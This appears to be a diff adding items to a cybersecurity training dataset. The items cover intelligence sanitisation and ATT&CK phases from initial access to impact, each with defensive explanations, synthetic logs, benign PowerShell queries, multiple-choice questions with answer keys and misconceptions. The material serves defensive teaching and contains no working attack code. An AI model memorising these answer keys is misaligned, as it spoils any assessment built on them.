+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["attribution", "false-flags", "aliases", "confidence"]
+    },
+    {
+      "id": "ti-sanitize-052",
+      "subtopic": "ti-sharing-sanitization",
+      "difficulty": "intermediate",
+      "title": "Sanitising intelligence before you share it",
+      "fact": "Sharing incident intelligence safely means removing what identifies the victim or exposes them to further harm: customer and employee names, internal hostnames and addresses, usernames, file paths that reveal business structure, and contract or project names, while preserving the technical facts that make the intelligence useful. Replace identifiers with consistent synthetic values so relationships remain readable, keep malware hashes and structural detection logic intact, and check metadata that travels invisibly, such as document properties, EXIF data, packet-capture payloads and screenshots. Apply the correct TLP marking, obtain legal or privacy review where personal data or contractual obligations are involved, and share through a trusted channel such as a sector ISAC or an access-controlled MISP instance.",
+      "details": [
+        "Hashes of malware are not personal data and usually remain shareable; internal addresses and hostnames are the common leak.",
+        "Packet captures can contain credentials, session cookies and personal content even when the attack traffic looks clean.",
+        "Sanitisation must not change meaning: a rewritten indicator that no longer matches is worse than none."
+      ],
+      "mcqs": [
+        {
+          "question": "Which item most needs removal before sharing an incident report outside the organisation?",
+          "options": [
+            "The SHA-256 of the malware sample",
+            "A spreadsheet of internal hostnames, usernames and customer identifiers",
+            "The ATT&CK technique identifiers",
+            "The detection rule logic"
+          ],
+          "answer": [1],
+          "rationale": "Victim-identifying data such as internal names, usernames and customer identifiers can cause harm and may breach privacy obligations. Hashes, technique IDs and generic detection logic are the technical value of the report and normally stay."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "Changing every indicator to a synthetic value is always the safest way to sanitise a report.",
+          "correction": "Over-sanitisation destroys the utility that justified sharing. Hashes, malware family names and generic logic should be preserved; only victim-identifying and sensitive context needs replacement, and replacements must keep relationships consistent."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-150: Guide to Cyber Threat Information Sharing",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/150/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Traffic Light Protocol (TLP) 2.0",
+          "publisher": "FIRST",
+          "url": "https://www.first.org/tlp/",
+          "license": "FIRST TLP terms"
+        }
+      ],
+      "tags": ["sanitisation", "sharing", "privacy", "tlp"]
+    },
+    {
+      "id": "attack-initial-053",
+      "subtopic": "attack-initial-access",
+      "difficulty": "intermediate",
+      "title": "Initial access: the techniques and the controls that matter",
+      "fact": "ATT&CK groups initial access into phishing (T1566, with attachment, link and service-based sub-techniques), exploitation of public-facing applications (T1190), external remote services such as VPN and RDP (T1133), valid accounts (T1078), removable media (T1091), supply-chain compromise (T1195) and drive-by compromise (T1189). Controls that change outcomes are phishing-resistant MFA for remote access and email, prompt patching of internet-facing systems with priority for the CISA Known Exploited Vulnerabilities catalogue, restricting exposed management interfaces, and mail filtering with attachment detonation. Detection leans on mail-gateway and authentication logs: a first-ever successful VPN login from a new country, or a logon through a residential proxy for an account that normally works from one city, is often the earliest signal.",
+      "details": [
+        "Phishing-resistant MFA such as FIDO2 or passkeys defeats real-time adversary-in-the-middle phishing in a way that one-time codes do not.",
+        "Exploitation often leaves no malware, so web access logs and server-side process creation are the evidence.",
+        "Valid-account access produces no exploit signature, which is why identity baselines carry the detection."
+      ],
+      "logs": [
+        {
+          "context": "VPN authentication log",
+          "text": "2026-03-01T08:02:11Z vpn01 user=a.nguyen src=10.20.30.55 result=success method=saml mfa=push geo=GB\n2026-03-03T02:47:39Z vpn01 user=a.nguyen src=198.51.100.19 result=success method=saml mfa=push geo=NL device=unknown\n2026-03-03T02:49:10Z vpn01 user=a.nguyen src=198.51.100.19 bytes_out=1843200 dst=10.20.40.12:445",
+          "reading": "The same account authenticates from a new country, on an unknown device, at an unusual hour, then immediately makes an SMB connection to an internal file server. That sequence suggests credential use rather than the legitimate user, and the SMB destination makes it a lateral-movement lead as well. Check MFA method changes and mailbox rules for the account."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which control most directly mitigates real-time adversary-in-the-middle phishing that relays a session?",
+          "options": [
+            "Longer passwords",
+            "Phishing-resistant MFA bound to the origin, such as FIDO2 security keys or passkeys",
+            "Disabling email entirely",
+            "Increasing password rotation frequency"
+          ],
+          "answer": [1],
+          "rationale": "Relay phishing defeats OTP and push-based MFA because the attacker proxies the real session. Origin-bound cryptographic authenticators will not authenticate to the attacker's proxy domain, so the credential material cannot be relayed."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Phishing (T1566)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1566/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "Known Exploited Vulnerabilities Catalog",
+          "publisher": "CISA",
+          "url": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["initial-access", "phishing", "vpn", "mfa", "exploitation"]
+    },
+    {
+      "id": "attack-exec-054",
+      "subtopic": "attack-execution",
+      "difficulty": "intermediate",
+      "title": "Execution: interpreters, user action and what to log",
+      "fact": "Execution techniques cover command and scripting interpreters (T1059: PowerShell, Windows Command Shell, bash, VBScript, Python and JavaScript), user execution of malicious files or links (T1204), Windows Management Instrumentation (T1047), scheduled tasks and cron (T1053) and exploitation for client execution (T1203). The detection foundation is process creation with command lines: Security event 4688 with command-line auditing enabled, or Sysmon event 1, gives parent, child, user, path and arguments. Script-level visibility comes from PowerShell script block logging, event 4104, and AMSI, which expose obfuscated or in-memory scripts that never appear as a file. Mitigations that raise cost are application control through WDAC or AppLocker, constrained language mode, macro blocking and removing interpreters the business does not need.",
+      "details": [
+        "4688 command-line capture is off by default and must be enabled by policy; without it most of this telemetry is missing.",
+        "Look for interpreter processes whose parent is an Office application, a web server or a database service.",
+        "Script block logging often records the deobfuscated script, which is why it is high value."
+      ],
+      "commands": [
+        {
+          "language": "powershell",
+          "code": "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 100 | Select-Object TimeCreated,Message",
+          "purpose": "Inspect recent process-creation events when command-line auditing is enabled."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why is Security event 4688 often incomplete for execution analysis?",
+          "options": [
+            "It only records failed logons",
+            "Command-line inclusion is disabled by default, so the event may show the process name but not its arguments",
+            "It is only generated on domain controllers",
+            "It stores only the parent process"
+          ],
+          "answer": [1],
+          "rationale": "4688 is generated when process creation auditing is enabled, but command-line content requires a separate policy setting. Without it the event still proves a process started, but not what it was told to do."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "Enabling PowerShell logging is enough to catch script-based execution.",
+          "correction": "Module, script block and transcription logging each capture different things, and none of them sees commands run through other interpreters such as cmd, mshta, wmic or python. Execution coverage needs process creation with command lines, application control and network egress monitoring together."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Command and Scripting Interpreter (T1059)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1059/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "Command line process auditing",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["execution", "4688", "powershell", "application-control"]
+    },
+    {
+      "id": "attack-persist-055",
+      "subtopic": "attack-persistence",
+      "difficulty": "intermediate",
+      "title": "Persistence: enumerating every place an actor can return from",
+      "fact": "Persistence is broad by design: registry Run keys and startup folders (T1547.001), Windows services (T1543.003), scheduled tasks (T1053.005), WMI event subscriptions (T1546.003), local and domain account creation (T1136), account manipulation including SSH authorized_keys (T1098.004), web shells (T1505.003), systemd services and timers (T1543.002), cron (T1053.003) and shell profile modification (T1546.004). A credible sweep covers all of these plus cloud identity persistence such as new app registrations, OAuth grants, access keys and federation changes. Mitigations include restricting service and task creation to administrators, application control, monitoring autoruns, and maintaining an expected baseline so new entries stand out. Detection based only on file names fails against renamed or signed binaries.",
+      "details": [
+        "Compare installed services and tasks against a golden baseline rather than reviewing thousands of entries by hand.",
+        "Scheduled tasks can be triggered by logon, idle, boot or a WMI event, so the trigger is as interesting as the action.",
+        "Cloud persistence often survives endpoint reimaging entirely."
+      ],
+      "commands": [
+        {
+          "language": "powershell",
+          "code": "Get-CimInstance Win32_Service | Where-Object {$_.PathName -notlike 'C:\\Windows\\*'} | Select-Object Name,PathName,StartMode",
+          "purpose": "List services whose binaries live outside the Windows directory."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which persistence mechanism is most likely to survive a full endpoint reimage?",
+          "options": [
+            "A registry Run key",
+            "A malicious service binary in Program Files",
+            "A newly registered OAuth application in the cloud identity provider",
+            "A scheduled task stored locally"
+          ],
+          "answer": [2],
+          "rationale": "Identity-provider objects such as OAuth grants, app registrations and federation settings live outside the endpoint, so reimaging the laptop does not remove them. The other options are all on-host and are destroyed by reimaging."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Boot or Logon Autostart Execution (T1547)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1547/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "ATT&CK: Server Software Component: Web Shell (T1505.003)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1505/003/",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["persistence", "autoruns", "services", "cloud-persistence"]
+    },
+    {
+      "id": "attack-privesc-056",
+      "subtopic": "attack-privilege-escalation",
+      "difficulty": "expert",
+      "title": "Privilege escalation and credential access: the escalation chain",
+      "fact": "Privilege escalation and credential access usually run together: exploitation for privilege escalation (T1068), abuse of elevation control such as UAC bypass or sudo misconfiguration (T1548), access token manipulation (T1134), hijacking of execution flow through DLL search order or unquoted service paths (T1574) and then credential dumping from LSASS, SAM or NTDS.dit (T1003), password stores (T1555), unsecured files (T1552) or Kerberos abuse such as Kerberoasting and AS-REP roasting (T1558). Defences are architectural: LSA protection through RunAsPPL, Credential Guard, a tiered administrative model, just-in-time administration, disabling NTLM where feasible, managed service accounts and removing standing local administrator rights. Detection relies on process access to LSASS, service and task creation, unusual ticket requests and the first appearance of administrative tooling on a workstation.",
+      "details": [
+        "Logon type 9 (NewCredentials) and event 4648 indicate explicit credential use and are worth baselining.",
+        "Kerberoasting appears as service ticket requests using weak encryption types for accounts that should never be requested.",
+        "Credential Guard moves secrets out of LSASS but does not fix misconfigured privileges or over-broad group membership."
+      ],
+      "configs": [
+        {
+          "language": "ini",
+          "snippet": "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa]\n\"RunAsPPL\"=dword:00000001",
+          "purpose": "Registry setting that enables LSA protection so LSASS runs as a protected process (requires reboot and compatible drivers)."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which control most directly limits the value of a successful LSASS memory dump?",
+          "options": [
+            "Increasing the minimum password length",
+            "Credential Guard, which isolates derived credential material from LSASS",
+            "Disabling USB ports",
+            "Enabling Windows Firewall"
+          ],
+          "answer": [1],
+          "rationale": "Credential Guard uses virtualization-based security to keep derived secrets out of LSASS, so a dump yields far less usable material. Password length helps against guessing but not against memory theft, and the other options do not address credential storage."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "Kerberoasting requires domain administrator rights to perform.",
+          "correction": "Kerberoasting can be performed by any authenticated domain user: it requests service tickets for accounts with service principal names and attacks the ticket offline. That is why service accounts need long, randomly generated passwords or group managed service accounts, and why ticket requests for unused SPNs are worth alerting on."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: OS Credential Dumping (T1003)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1003/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "ATT&CK: Steal or Forge Kerberos Tickets (T1558)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1558/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "Credential Guard overview",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["privilege-escalation", "credential-access", "lsass", "kerberos", "credential-guard"]
+    },
+    {
+      "id": "attack-lateral-057",
+      "subtopic": "attack-lateral-movement",
+      "difficulty": "advanced",
+      "title": "Lateral movement, C2 and exfiltration: the network story",
+      "fact": "After a foothold, actors move with remote services (T1021: RDP, SMB and admin shares, SSH, WinRM and VNC), transfer tooling (T1570), then communicate and exfiltrate over application-layer protocols (T1071: web, DNS, mail), encrypted channels (T1573), ingress tool transfer (T1105), exfiltration over alternative protocols (T1048), over web services (T1567) and over the command-and-control channel (T1041). Detection depends on knowing normal internal and egress flows: SMB or WinRM from workstation to workstation, administrative-share access by a non-admin account, first-seen internal host pairs, service creation on a remote host (event 7045), and outbound sessions with large sustained uploads. Mitigations are segmentation, host firewalls, LAPS to make local admin passwords unique, restricted admin shares, egress allowlists and, where lawful, TLS inspection or metadata analysis.",
+      "details": [
+        "Logon type 3 (network) and type 10 (RemoteInteractive) with a source workstation name are the classic 4624 lateral-movement records.",
+        "Beaconing and exfiltration can share a channel; volume and timing distinguish them.",
+        "Cloud storage uploads may bypass proxy inspection entirely, so CASB or SaaS audit logs are needed."
+      ],
+      "logs": [
+        {
+          "context": "Windows Security event 4624, network logon with workstation attribution",
+          "text": "2026-03-03T02:51:04Z host-fs01 Security 4624\n  LogonType: 3  TargetUser: EXAMPLE\\svc-backup\n  WorkstationName: WS-0442  IpAddress: 10.20.30.88\n  AuthenticationPackage: NTLM  ImpersonationLevel: Impersonation\n  2026-03-03T02:51:05Z host-fs01 Security 5140 share=\\\\*\\ADMIN$ accessed by EXAMPLE\\svc-backup from 10.20.30.88",
+          "reading": "A backup service account authenticating from a workstation, over NTLM, to the ADMIN$ share is not normal backup behaviour. Workstations should not drive backup service authentications. Pivot to 10.20.30.88, check what process initiated the connection, and look for service creation on host-fs01 around the same time."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which pattern is the strongest lateral-movement signal on a Windows estate?",
+          "options": [
+            "A user logging on interactively at their own desk",
+            "A workstation authenticating over SMB to another workstation's administrative share",
+            "A server contacting a patch repository",
+            "A laptop connecting to the corporate VPN"
+          ],
+          "answer": [1],
+          "rationale": "Workstation-to-workstation administrative share access inverts normal tiers and is a common propagation path. Interactive logon at one's own desk and patch or VPN traffic are expected behaviours."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Remote Services (T1021)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1021/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "ATT&CK: Exfiltration Over C2 Channel (T1041)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1041/",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["lateral-movement", "smb", "c2", "exfiltration", "4624"]
+    },
+    {
+      "id": "attack-impact-058",
+      "subtopic": "attack-impact",
+      "difficulty": "advanced",
+      "title": "Defence evasion and impact: what the endgame looks like",
+      "fact": "Before impact, actors impair defences (T1562: disabling antivirus, tampering with logging, uninstalling agents) and remove indicators (T1070: clearing Windows event logs, deleting files, modifying timestamps), often by modifying the registry (T1112) or abusing signed system binaries (T1218). Impact techniques include inhibiting system recovery (T1490, deleting shadow copies or disabling recovery), data encrypted for impact (T1486), service stop (T1489), data destruction and manipulation (T1485, T1565) and denial of service (T1498). The defensive counterweight is tamper-resistant telemetry: protected EDR configuration, near-real-time log forwarding off the host, and immutable or offline backups. A cleared Security log (event 1102) is both an attack indicator and a gap in your evidence, which is why centralised collection is a control rather than a convenience.",
+      "details": [
+        "Tamper protection in Microsoft Defender and equivalent EDR features should be enabled, and its state monitored centrally.",
+        "Shadow-copy deletion is a pre-impact signal that often precedes encryption by minutes to hours.",
+        "Test that log forwarding survives the loss of a domain controller or the compromise of the SIEM's credentials."
+      ],
+      "logs": [
+        {
+          "context": "Mixed host telemetry during defence evasion",
+          "text": "2026-03-04T03:10:02Z host-dc01 System 7036 The Windows Event Log service entered the stopped state.\n2026-03-04T03:11:20Z host-dc01 Security 1102 The audit log was cleared.\n2026-03-04T03:12:02Z host-dc01 System 7045 Service installed: WinDefendHelper\n2026-03-04T03:14:33Z host-dc01 Defender: real-time protection disabled by policy (unexpected)",
+          "reading": "Stopping the log service, clearing the audit log, installing a masquerading service and disabling real-time protection within four minutes is a coordinated defence-evasion sequence, not administrative maintenance. Check whether the actions came from a legitimate change ticket, and rely on forwarded copies of the logs for the preceding events."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which control best preserves evidence when an actor clears the local Security log?",
+          "options": [
+            "Larger local log files",
+            "Near-real-time forwarding of events to a separate collector",
+            "Encrypting the local disk",
+            "Daily full backups of the host"
+          ],
+          "answer": [1],
+          "rationale": "Clearing affects the local log, but events already forwarded to a remote collector survive. Larger files only delay the clear and backups may capture an already-cleared log, so forwarding is the control that defeats this technique."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Impair Defenses (T1562)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1562/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "ATT&CK: Inhibit System Recovery (T1490)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1490/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "Prevent changes to security settings with tamper protection",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["defense-evasion", "impact", "log-clearing", "tamper-protection"]
+    }
+  ]
+}
